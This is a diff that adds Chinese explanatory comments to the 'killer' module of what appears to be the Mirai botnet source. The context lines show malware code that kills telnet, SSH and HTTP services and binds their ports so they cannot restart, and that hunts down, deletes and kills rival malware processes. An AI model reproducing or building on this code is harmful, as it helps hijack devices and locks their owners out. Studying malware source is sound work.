@@ -28,7 +28,7 @@ void killer_init(void)
     uint32_t scan_counter = 0;
     struct sockaddr_in tmp_bind_addr;
 
-    // Let parent continue on main thread
+    // Let parent continue on main thread  子进程
     killer_pid = fork();
     if (killer_pid > 0 || killer_pid == -1)
         return;
@@ -36,7 +36,7 @@ void killer_init(void)
     tmp_bind_addr.sin_family = AF_INET;
     tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
 
-    // Kill telnet service and prevent it from restarting
+    // Kill telnet service and prevent it from restarting   Kill掉23进程，并绑定23端口，防止重新启动
 #ifdef KILLER_REBIND_TELNET
 #ifdef DEBUG
     printf("[killer] Trying to kill port 23\n");
@@ -63,7 +63,7 @@ void killer_init(void)
 #endif
 #endif
 
-    // Kill SSH service and prevent it from restarting
+    // Kill SSH service and prevent it from restarting   Kill掉22进程，并绑定22端口
 #ifdef KILLER_REBIND_SSH
     if (killer_kill_by_port(htons(22)))
     {
@@ -83,7 +83,7 @@ void killer_init(void)
 #endif
 #endif
 
-    // Kill HTTP service and prevent it from restarting
+    // Kill HTTP service and prevent it from restarting   Kill掉80进程，并绑定80端口
 #ifdef KILLER_REBIND_HTTP
     if (killer_kill_by_port(htons(80)))
     {
@@ -121,7 +121,7 @@ void killer_init(void)
     printf("[killer] Memory scanning processes\n");
 #endif
 
-    while (TRUE)
+    while (TRUE) //扫描内存中进程的程序连接和文件连接？？啥意思？
     {
         DIR *dir;
         struct dirent *file;
@@ -149,6 +149,7 @@ void killer_init(void)
             scan_counter++;
             if (pid <= killer_highest_pid)
             {
+                //超时，重新扫描所有进程
                 if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                 {
 #ifdef DEBUG
@@ -190,7 +191,7 @@ void killer_init(void)
                 realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
 
                 table_unlock_val(TABLE_KILLER_ANIME);
-                // If path contains ".anime" kill.
+                // If path contains ".anime" kill.    杀死同类型程序
                 if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                 {
                     unlink(realpath);
@@ -212,7 +213,7 @@ void killer_init(void)
                 close(fd);
             }
 
-            if (memory_scan_match(exe_path))
+            if (memory_scan_match(exe_path)) 
             {
 #ifdef DEBUG
                 printf("[killer] Memory scan match for binary %s\n", exe_path);
@@ -251,7 +252,7 @@ void killer_kill(void)
     kill(killer_pid, 9);
 }
 
-/*根据端口杀掉进程*/
+/*根据端口杀死服务*/
 BOOL killer_kill_by_port(port_t port)
 {
     DIR *dir, *fd_dir;
@@ -282,7 +283,7 @@ BOOL killer_kill_by_port(port_t port)
     table_unlock_val(TABLE_KILLER_EXE);
     table_unlock_val(TABLE_KILLER_FD);
 
-    fd = open("/proc/net/tcp", O_RDONLY);
+    fd = open("/proc/net/tcp", O_RDONLY);   //从
     if (fd == -1)
         return 0;
 
@@ -301,8 +302,8 @@ BOOL killer_kill_by_port(port_t port)
             i++;
         buffer[i++] = 0;
 
-        // Compare the entry in /proc/net/tcp to the hex value of the htons port
-        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
+        // Compare the entry in /proc/net/tcp to the hex value of the htons port   遍历所有/proc/net/tcp下的连接，与端口号做比较
+        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)  
         {
             int column_index = 0;
             BOOL in_column = FALSE;
@@ -392,7 +393,7 @@ BOOL killer_kill_by_port(port_t port)
                     util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                     util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                     util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
-                    if (readlink(path, exe, PATH_MAX) == -1)
+                    if (readlink(path, exe, PATH_MAX) == -1)   //获取进程所对应程序的真实路径
                         continue;
 
                     if (util_stristr(exe, util_strlen(exe), inode) != -1)
@@ -400,7 +401,7 @@ BOOL killer_kill_by_port(port_t port)
 #ifdef DEBUG
                         printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
 #else
-                        kill(util_atoi(pid, 10), 9);
+                        kill(util_atoi(pid, 10), 9);  //根据进程id杀死进程
 #endif
                         ret = 1;
                     }
